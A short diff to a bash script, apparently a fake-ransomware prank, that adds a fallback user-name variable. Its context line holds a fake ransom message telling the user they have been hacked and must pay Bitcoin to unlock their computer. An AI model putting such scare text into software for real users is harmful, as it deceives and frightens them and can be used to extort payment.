@@ -4,6 +4,12 @@ RED=$(tput setaf 1)
 GREEN=$(tput setaf 2)
 BLINK=$(tput blink)
 NORMAL=$(tput sgr0)
+if [[ -n ${USER} ]]
+then
+    USER_NAME="${USER}"
+else
+    USER_NAME="Hey"
+fi
 
 DOLUS_TEXT="${USER}, you have been hacked! Wire 0.02 Bitcoins to the following address to unlock your computer:\n"
 
